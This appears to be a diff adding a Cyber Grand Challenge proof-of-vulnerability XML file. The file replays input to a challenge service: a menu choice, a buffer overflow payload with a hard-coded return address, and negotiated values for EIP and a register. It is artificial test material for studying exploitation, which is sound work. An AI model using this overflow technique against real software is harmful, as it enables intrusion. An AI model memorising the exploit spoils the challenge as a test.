@@ -1,0 +1,25 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+<cbid>service</cbid>
+<replay>
+	<negotiate>
+		<type1>
+		<ipmask>0xFFFFFFFF</ipmask>
+		<regmask>0xFFFFFFFF</regmask>
+		<regnum>5</regnum>
+		</type1>
+	</negotiate>
+
+	<read><length>38</length></read>
+	<write> <data>1\n</data> </write>
+	<read><length>12</length></read>
+	<write> <data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x17\xaf\x04\x08BBBB</data> </write>
+
+	<!-- write the value intended to end up in any other GPR -->
+	<write><var>TYPE1_REG</var></write>
+	<!-- write the value intended to end up in EIP -->
+	<write><var>TYPE1_IP</var></write>
+</replay>
+</cfepov>
+
